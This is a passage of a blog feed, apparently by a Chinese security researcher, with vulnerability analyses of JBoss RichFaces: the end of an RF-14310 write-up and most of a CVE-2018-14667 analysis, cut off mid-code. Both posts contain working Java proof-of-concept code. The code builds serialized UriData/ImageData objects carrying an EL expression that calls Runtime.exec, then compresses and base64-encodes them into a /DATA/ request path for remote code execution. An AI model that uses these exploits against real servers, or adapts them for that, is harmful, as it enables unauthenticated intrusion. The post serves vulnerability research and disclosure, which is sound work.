class="string">"_height"</span>);</span><br><span class="line">                _heightField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                _heightField.set(imageData, <span class="number">120</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">//    设置ImageData_data</span></span><br><span class="line">                Field _dataField = imageData.getClass().getDeclaredField(<span class="string">"_data"</span>);</span><br><span class="line">                _dataField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                _dataField.set(imageData, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">//    设置ImageData_format</span></span><br><span class="line">                Field _formatField = imageData.getClass().getDeclaredField(<span class="string">"_format"</span>);</span><br><span class="line">                _formatField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                _formatField.set(imageData, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">//    设置ImageData_paint</span></span><br><span class="line">                Field _paintField = imageData.getClass().getDeclaredField(<span class="string">"_paint"</span>);</span><br><span class="line">                _paintField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                _paintField.set(imageData, _paint);</span><br><span class="line"></span><br><span class="line">                <span class="comment">//    设置ImageData_paint</span></span><br><span class="line">                Field cacheableField = imageData.getClass().getDeclaredField(<span class="string">"cacheable"</span>);</span><br><span class="line">                cacheableField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                cacheableField.set(imageData, <span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">//    设置ImageData_bgColor</span></span><br><span class="line">                Field _bgColorField = imageData.getClass().getDeclaredField(<span class="string">"_bgColor"</span>);</span><br><span class="line">                _bgColorField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                _bgColorField.set(imageData, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 2. 序列化</span></span><br><span class="line">                ByteArrayOutputStream byteArrayOutputStream = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">                ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(byteArrayOutputStream);</span><br><span class="line">                objectOutputStream.writeObject(imageData);</span><br><span class="line">                objectOutputStream.flush();</span><br><span class="line">                objectOutputStream.close();</span><br><span class="line">                byteArrayOutputStream.close();</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 3. 加密（zip+base64）</span></span><br><span class="line">                <span class="keyword">byte</span>[] pocData = byteArrayOutputStream.toByteArray();</span><br><span class="line">                Deflater compressor = <span class="keyword">new</span> Deflater(<span class="number">1</span>);</span><br><span class="line">                <span class="keyword">byte</span>[] compressed = <span class="keyword">new</span> <span class="keyword">byte</span>[pocData.length + <span class="number">100</span>];</span><br><span class="line">                compressor.setInput(pocData);</span><br><span class="line">                compressor.finish();</span><br><span class="line">                <span class="keyword">int</span> totalOut = compressor.deflate(compressed);</span><br><span class="line">                <span class="keyword">byte</span>[] zipsrc = <span class="keyword">new</span> <span class="keyword">byte</span>[totalOut];</span><br><span class="line">                System.arraycopy(compressed, <span class="number">0</span>, zipsrc, <span class="number">0</span>, totalOut);</span><br><span class="line">                compressor.end();</span><br><span class="line">                <span class="keyword">byte</span>[]dataArray = URL64Codec.encodeBase64(zipsrc);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 4. 打印最后的poc</span></span><br><span class="line">                String poc = <span class="string">"/DATA/"</span> + <span class="keyword">new</span> String(dataArray, <span class="string">"ISO-8859-1"</span>) + <span class="string">".jsf"</span>;</span><br><span class="line">                System.out.println(poc);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/05/15439950217838.jpg" alt="-w1279"></p><h1 id="0x04-Reference"><a href="#0x04-Reference" class="headerlink" title="0x04 Reference"></a>0x04 Reference</h1><ul><li><a href="https://access.redhat.com/security/cve/cve-2018-12533" target="_blank" rel="noopener">https://access.redhat.com/security/cve/cve-2018-12533</a></li><li><a href="https://dzone.com/articles/what-is-serialversionuid" target="_blank" rel="noopener">https://dzone.com/articles/what-is-serialversionuid</a></li><li><a href="https://docs.oracle.com/javaee/6/tutorial/doc/bnahu.html" target="_blank" rel="noopener">https://docs.oracle.com/javaee/6/tutorial/doc/bnahu.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;RF-14310，另一个RichFaces的漏洞，利用面要比CVE-14667广。&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞分析" scheme="https://lucifaer.com/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="漏洞分析" scheme="https://lucifaer.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="Java" scheme="https://lucifaer.com/tags/Java/"/>
    
      <category term="RichFaces" scheme="https://lucifaer.com/tags/RichFaces/"/>
    
  </entry>
  
  <entry>
    <title>JBoss RichFaces Unserialize+EL=RCE Analysis（CVE-2018-14667）</title>
    <link href="https://lucifaer.com/2018/11/29/JBoss%20RichFaces%20Unserialize+EL=RCE%20Analysis%EF%BC%88CVE-2018-14667%EF%BC%89/"/>
    <id>https://lucifaer.com/2018/11/29/JBoss RichFaces Unserialize+EL=RCE Analysis（CVE-2018-14667）/</id>
    <published>2018-11-29T09:01:00.000Z</published>
    <updated>2018-12-12T08:38:17.674Z</updated>
    
    <content type="html"><![CDATA[<p>刚开始分析Java的漏洞，很多东西感觉还是有待学习…</p><a id="more"></a><h1 id="0x00-漏洞描述"><a href="#0x00-漏洞描述" class="headerlink" title="0x00 漏洞描述"></a>0x00 漏洞描述</h1><blockquote><p>The RichFaces Framework 3.X through 3.3.4 is vulnerable to Expression Language (EL) injection via the UserResource resource. A remote, unauthenticated attacker could exploit this to execute arbitrary code using a chain of java serialized objects via org.ajax4jsf.resource.UserResource$UriData.</p></blockquote><p>根据漏洞描述，可以得知是通过<code>UserResource</code>注入EL表达式而造成的rce。而未经身份验证的攻击者可以通过<code>org.ajax4jsf.resource.UserResource$UriData</code>的反序列化利用链，完成rce。</p><h1 id="0x01-整体触发流程"><a href="#0x01-整体触发流程" class="headerlink" title="0x01 整体触发流程"></a>0x01 整体触发流程</h1><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">MediaOutputRenderer$doEncodeBegin:<span class="number">54</span> </span><br><span class="line"># 触发createUserResource方法，将序列化内容写到Map映射中</span><br><span class="line">BaseFilter$doFilter</span><br><span class="line">  InternetResourceService$serviceResource:101 # 根据resourceKey获取资源</span><br><span class="line">    ResourceBuilderImpl$getResourceForKey:217 # 从Map映射中利用键值获取序列化内容</span><br><span class="line">  InternetResourceService$serviceResource:106 # 根据resourceKey获取资源</span><br><span class="line">    ResourceBuilderImpl$getResourceDataForKey:227 # 白名单过滤，反序列化</span><br><span class="line">  InternetResourceService$serviceResource:115 # 触发反序列化方法</span><br><span class="line">    UserResource$getLastModified:73 # 可被触发的反序列化方法之一</span><br><span class="line">        ValueExpression$getValue:4 # 执行el表达式</span><br></pre></td></tr></table></figure><h1 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h1><h2 id="2-1-UserResource"><a href="#2-1-UserResource" class="headerlink" title="2.1 UserResource"></a>2.1 UserResource</h2><p>官方给的描述是通过<code>UserResource</code>类进行EL表达式注入的，全局搜一下<code>UserResource</code>这个类，定位到<code>org.ajax4jsf.resource.UserResource</code>。同样官方说可以用<code>UriData</code>进行反序列化利用链的构造，简单看了一下，需要注意的以下三个方法：</p><ul><li><code>send()</code></li><li><code>getLastModified()</code></li><li><code>getExpired()</code></li></ul><p>以上三个方法流程大致相同，挑了<code>getLastModified</code>跟一下：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15428852833815.jpg" alt=""></p><p>可以看出能利用<code>UriData</code>执行<code>EL</code>表达式。跟一下<code>UriData</code>是从哪里来的：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15428853866092.jpg" alt=""></p><p>无论怎样最后会获得一个对象，继续跟一下：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15428854805708.jpg" alt=""></p><p>getter/setter方法获值，跟进一下是什么地方赋值的，在<code>org.ajax4jsf.resource.ResourceContext$serviceResource</code></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15428856471020.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15428860245711.jpg" alt=""></p><p>可以清楚的看出，在</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">resourceContext.setResourceData(resourceDataForKey);</span><br></pre></td></tr></table></figure><p>这里完成了set方法。我们现在跟一下上面的流成，看看<code>resourceContext</code>具体是一个什么东西。</p><h2 id="2-2-InternetResourceService"><a href="#2-2-InternetResourceService" class="headerlink" title="2.2 InternetResourceService"></a>2.2 InternetResourceService</h2><p>首先跟一下<code>getResourceDataForKey</code>:</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15428862358196.jpg" alt=""></p><p>根据继承关系可以看到是在<code>ResourceBuilderImpl</code>中实现的：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15428864830056.jpg" alt=""></p><p>首先对<code>resourceDataForKey</code>进行了字符串截取，之后将字符串进行解密，最后调用了<code>LookAheadObjectInputStream</code>，我们跟一下这个类有什么作用：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15428866292918.jpg" alt=""></p><p>可以看到这个类重写了<code>resolveClass</code>方法，也就是说在加载过程中会调用到这个resolveClass方法，并连接到指定的类。在其中有一个<code>this.isClassValid(desc.getName())</code>实现了白名单检测：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15428868689189.jpg" alt=""></p><p>可以看到调用了<code>class.isAssignableFrom</code>校验反序列化的类，也就是说如果反序列化的类是白名单中类的子类或者接口是可以通过该项校验的。向下看一下，可以发现<code>whitelistBaseClasses</code>是从<code>resource-serialization.properties</code>中加载的：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15429427438957.jpg" alt=""></p><p>而<code>UserResource</code>恰好是<code>InternetResource</code>的子类，<code>UserResource$UriData</code>是<code>SerializableResource</code>的子类：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15429429936952.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15429430049631.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15429430169919.jpg" alt=""></p><p>所以满足反序列化白名单的要求。</p><p>反过头来看一下之前的字符串解密过程：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15429435113686.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15429435343365.jpg" alt=""></p><p><code>Coded</code>中的<code>d</code>为<code>null</code>，也就是说这个解密过程为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base64decode -&gt; zip解密</span><br></pre></td></tr></table></figure><p>现在反序列化流程是我们可以控制的，我们回头看一下组成<code>resourceContext</code>的另一部分<code>resource</code>的生成过程：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15429439065660.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15429439262635.jpg" alt=""></p><p>首先对url进行了截取，之后通过键值关系在Map映射中获取资源。看一下在哪里对Map进行的填充：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15429443009097.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15429444021912.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15429444317113.jpg" alt=""></p><p>可以看到首先根据生成的path去获取<code>userResource</code>，获取不到的话就new一个，然后加入到<code>resources Map</code>中，也就是说只要我们找到哪里调用了<code>createUserResource</code>就可以控制<code>source</code>的值。</p><p>查看<code>createUserResource</code>的调用点时发现只有<code>MediaOutputRenderer$doEncodeBegin</code>调用了该方法。</p><h2 id="2-3-MediaOutputRenderer"><a href="#2-3-MediaOutputRenderer" class="headerlink" title="2.3 MediaOutputRenderer"></a>2.3 MediaOutputRenderer</h2><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15430325852196.jpg" alt=""></p><p>看一下<code>MediaOutputRenderer</code>的处理逻辑，首先创建了<code>userResource</code>，然后调用了getter的方法获取<code>userResource</code>的<code>Uri</code>，之后将<code>Uri</code>放到了<code>ResponseWriter</code>中，我们看一下最后这个<code>ResponseWriter</code>最后干了什么：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15430337246992.jpg" alt=""></p><p>将会把<code>URL</code>打印到页面上。</p><p>现在我们看一下<code>getUri</code>的处理过程：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15430343712076.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15430343808321.jpg" alt=""></p><p>调用到了<code>UserResource$getDataToStore</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15430346212562.jpg" alt=""></p><p>可以看到主要完成的工作就是将<code>MediaOutputRenderer</code>的<code>component</code>参数（从代码中可以看出是从标签字段中获得的值）中的一些值提取出来赋值到<code>UriData</code>对象中，最后返回<code>UriData</code>对象。</p><p>继续跟进一下<code>getUri</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15432033687052.jpg" alt=""></p><p>可以看到<code>storeData</code>就是<code>UriData</code>对象，将其序列化后经过encrypt加密后返回到<code>resourceURL</code>中。回看一下反序列化过程：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15432049639534.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15432050454317.jpg" alt=""></p><p>也就是我们只需要构造<code>/DATA/</code>后的数据就好，<code>/DATA/</code>前半段的数据是可以从<code>url</code>中获取的：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15432053292392.jpg" alt=""></p><p>至此整个RCE的流程就分析完了。</p><h1 id="0x03-构造POC"><a href="#0x03-构造POC" class="headerlink" title="0x03 构造POC"></a>0x03 构造POC</h1><p>梳理整理整个的触发流程，发现该漏洞可执行<code>getLastModified</code>、<code>getExpired</code>、<code>send</code>这三个方法，完成EL表达式的执行，但是他们的触发条件是不同的：</p><ul><li><code>resource.isCacheable</code>为<code>true</code>触发<code>getLastModified</code>、<code>getExpired</code></li><li><code>resource.isCacheable</code>为<code>false</code>触发<code>getLastModified</code>、<code>send</code></li></ul><p>这里解释一下为什么在<code>resource.isCacheable</code>为<code>false</code>时还会触发<code>getLastModified</code>，调用栈如下：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">InternetResourceService$serviceResource:152 # 进入else处理环节</span><br><span class="line">  ResourceLifecycle$send:37 # 无论如何都会调用sendResource方法</span><br><span class="line">  ResourceLifecycle$send:117 # resource.sendHeaders触发getLastModified方法，send触发send方法。</span><br></pre></td></tr></table></figure><p>可以看到最稳定的触发点就是<code>getLastModified</code>，接下来的poc也以这个稳定触发点为例。根据在0x01中已经提及的流程，逆向的生成<code>UriData</code>，序列化，加密，即可。</p><h2 id="3-1-选择反射生成的对象"><a href="#3-1-选择反射生成的对象" class="headerlink" title="3.1 选择反射生成的对象"></a>3.1 选择反射生成的对象</h2><p>根据<a href="https://tint0.com/when-el-injection-meets-java-deserialization/" target="_blank" rel="noopener">tint0</a>的文章，选择使用<code>javax.faces.component.StateHolderSaver</code>来作为反射生成的对象，也就是<code>modified</code>对象，使用这个对象的原因是因为这个对象在反序列化失败时可以返回一个<code>null</code>对象，最后应用会返回一个200状态码，而当反序列化成功时，就尝试将状态对象转换成一个数组，如果失败时会抛出一个Richface无法捕捉的异常，应用最后返回一个500状态码。利用状态码的不同，可以判断我们的反序列化过程是否成功执行。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">String pocEL = <span class="string">"#&#123;request.getClass().getClassLoader().loadClass(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null).exec(\"open /Applications/Calculator.app\")&#125;"</span>;</span><br><span class="line"><span class="comment">// 根据文章https://www.anquanke.com/post/id/160338</span></span><br><span class="line">Class cls = Class.forName(<span class="string">"javax.faces.component.StateHolderSaver"</span>);</span><br><span class="line">Constructor ct = cls.getDeclaredConstructor(FacesContext.class, Object.class);</span><br><span class="line">ct.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">Location location = <span class="keyword">new</span> Location(<span class="string">""</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><h2 id="3-2-生成UriData"><a href="#3-2-生成UriData" class="headerlink" title="3.2 生成UriData"></a>3.2 生成<code>UriData</code></h2><p>主要点在于构造<code>UriData</code>中的<code>modified</code>字段。首先整理生成<code>modified</code>所需要的几个条件：</p><ol><li>Date类的对象</li><li>生成该对象时需要调用一个<code>ValueExpression</code>类的<code>getValue</code></li></ol><p>跟一下<code>getValue</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15434769432673.jpg" alt=""></p><p>根据继承类来看，右边框内的类都是我们可以利用的，以<code>TagValueExpression</code>举例：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15434770897435.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15434771445410.jpg" alt=""></p><p>可以看到需要另外一个<code>ValueExpression</code>类，并且调用其<code>getValue</code>的方法。</p><p>我们首先看该构造函数的第一个需要构造的参数<code>attr</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15434773457520.jpg" alt=""></p><p>该类的构造函数为：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15434773747344.jpg" alt=""></p><p>可以看到关键点在于将我们的EL表达式构造到<code>value</code>处，其他的参数可以为空。</p><p>接着看第二个需要构造的参数<code>orig</code>，这里我们调用另一个<code>ValueExpressionImpl</code>类来构造这个<code>orig</code>参数：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15434775915179.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15434776020023.jpg" alt=""></p><p>跟一下<code>getNode</code>和<code>getValue</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15434780150816.jpg" alt=""></p><p>下个断动态调一下，发现应如此构造<code>expr</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pocEL+&quot; modified&quot;</span><br></pre></td></tr></table></figure><p>其他的参数可以为空。这样我们就可以构造一个完整的<code>TagValueExpression</code>类，这个类可以执行我们的EL表达式。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 设置UriData</span></span><br><span class="line"><span class="comment">//    设置UriData.value</span></span><br><span class="line">Object value = <span class="string">"cve-2018-14667"</span>;</span><br><span class="line"><span class="comment">//    设置UriData.createContent</span></span><br><span class="line">Object createContent = <span class="string">"cve-2018-14667"</span>;</span><br><span class="line"><span class="comment">//    设置UriData.expires</span></span><br><span class="line">Object expires = <span class="string">"cve-2018-14667"</span>;</span><br><span class="line"><span class="comment">//    设置UriData.modified</span></span><br><span class="line">TagAttribute tag = <span class="keyword">new</span> TagAttribute(location, <span class="string">""</span>, <span class="string">""</span>, <span class="string">"poc"</span>, <span class="string">"modified="</span>+pocEL);</span><br><span class="line">ValueExpressionImpl valueExpression = <span class="keyword">new</span> ValueExpressionImpl(pocEL+<span class="string">" modified"</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, Date.class);</span><br><span class="line">TagValueExpression tagValueExpression = <span class="keyword">new</span> TagValueExpression(tag, valueExpression);</span><br><span class="line">Object modified = ct.newInstance(<span class="keyword">null</span>, tagValueExpression);</span><br></pre></td></tr></table></figure><h2 id="3-3-序列化"><a href="#3-3-序列化" class="headerlink" title="3.3 序列化"></a>3.3 序列化</h2><p>之后的步骤就是利用反射构造一个<code>UriData</code>，并进行初始化，同时执行序列化：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">UserResource.UriData uriData = <span class="keyword">new</span> UserResource.UriData();</span><br><span class="line"></span><br><span class="line">Field valueField = uriData.getClass().getDeclaredField(<span class="string">"value"</span>);</span><br><span class="line">valueField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">valueField.set(uriData, value);</span><br><span class="line"></span><br><span class="line">Field createContentField = uriData.getClass().getDeclaredField(<span class="string">"createContent"</span>);</span><br><span class="line">createContentField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">createContentField.set(uriData, createContent);</span><br><span class="line"></span><br><span class="line">Field expiresField = uriData.getClass().getDeclaredField(<span class="string">"expires"</span>);</span><br><span class="line">expiresField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">expiresField.set(uriData, expires);</span><br><span class="line"></span><br><span class="line">Field modifiedField = uriData.getClass().getDeclaredField(<span class="string">"modified"</span>);</span><br><span class="line">modifiedField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">modifiedField.set(uriData, modified);</span><br><span class="line"></span><br><span class="line">ByteArrayOutputStream byteArrayOutputStream = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(byteArrayOutputStream);</span><br><span class="line">objectOutputStream.writeObject(uriData);</span><br><span class="line">objectOutputStream.flush();</span><br><span class="line">objectOutputStream.close();</span><br><span class="line">byteArrayOutputStream.close();</span><br></pre></td></tr></table></figure><h2 id="3-4-加密"><a href="#3-4-加密" class="headerlink" title="3.4 加密"></a>3.4 加密</h2><p>可以直接复制<code>ResourceBuilderImpl$encrypt</code>的加密函数，就在<code>decrypt</code>的上面：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">byte</span>[] pocData = byteArrayOutputStream.toByteArray();</span><br><span class="line">Deflater compressor = <span class="keyword">new</span> Deflater(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">byte</span>[] compressed = <span class="keyword">new</span> <span class="keyword">byte</span>[pocData.length + <span class="number">100</span>];</span><br><span class="line">compressor.setInput(pocData);</span><br><span class="line">compressor.finish();</span><br><span class="line"><span class="keyword">int</span> totalOut = compressor.deflate(compressed);</span><br><span class="line"><span class="keyword">byte</span>[] zipsrc = <span class="keyword">new</span> <span class="keyword">byte</span>[totalOut];</span><br><span class="line">System.arraycopy(compressed, <span class="number">0</span>, zipsrc, <span class="number">0</span>, totalOut);</span><br><span class="line">compressor.end();</span><br><span class="line"><span class="keyword">byte</span>[]dataArray = URL64Codec.encodeBase64(zipsrc);</span><br></pre></td></tr></table></figure><p>这里要注意一下顺序，在反序列化前，解密的顺序为base64+zip，那么加密过程就需要zip+base64。</p><h2 id="完整版POC"><a href="#完整版POC" class="headerlink" title="完整版POC"></a>完整版POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.facelets.el.TagValueExpression;</span><br><span class="line"><span class="keyword">import</span> com.sun.facelets.tag.TagAttribute;</span><br><span class="line"><span class="keyword">import</span> com.sun.facelets.tag.Location;</span><br><span class="line"><span class="keyword">import</span> org.ajax4jsf.util.base64.URL64Codec;</span><br><span class="line"><span class="keyword">import</span> org.jboss.el.ValueExpressionImpl;</span><br><span class="line"><span class="keyword">import</span> org.ajax4jsf.resource.UserResource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">import</span> java.util.zip.Deflater;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.faces.context.FacesContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">poc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        String pocEL = <span class="string">"#&#123;request.getClass().getClassLoader().loadClass(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null).exec(\"open /Applications/Calculator.app\")&#125;"</span>;</span><br><span class="line">        <span class="comment">// 根据文章https://www.anquanke.com/post/id/160338</span></span><br><span class="line">        Class cls = Class.forName(<span class="string">"javax.faces.component.StateHolderSaver"</span>);</span><br><span class="line">        Constructor ct = cls.getDeclaredConstructor(FacesContext.class, Object.class);</span><br><span class="line">        ct.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        Location location = <span class="keyword">new</span> Location(<span class="string">""</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1. 设置UriData</span></span><br><span class="line">        <span class="comment">//    设置UriData.value</span></span><br><span class="line">        Object value = <span class="string">"cve-2018-14667"</span>;</span><br><span class="line">        <span class="comment">//    设置UriData.createContent</span></span><br><span class="line">        Object createContent = <span class="string">"cve-2018-14667"</span>;</span><br><span class="line">        <span class="comment">//    设置UriData.expires</span></span><br><span class="line">        Object expires = <span class="string">"cve-2018-14667"</span>;</span><br><span class="line">        <span class="comment">//    设置UriData.modified</span></span><br><span class="line">        TagAttribute tag = <span class="keyword">new</span> TagAttribute(location, <span class="string">""</span>, <span class="string">""</span>, <span class="string">"poc"</span>, <span class="string">"modified="</span>+pocEL);</span><br><span class="line">        ValueExpressionImpl valueExpression = <span class="keyword">new</span> ValueExpressionImpl(pocEL+<span class="string">" modified"</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, Date.class);</span><br><span class="line">        TagValueExpression tagValueExpression = <span class="keyword">new</span> TagValueExpression(tag, valueExpression);</span><br><span class="line">        Object modified = ct.newInstance(<span class="keyword">null</span>, tagValueExpression);</span><br><span 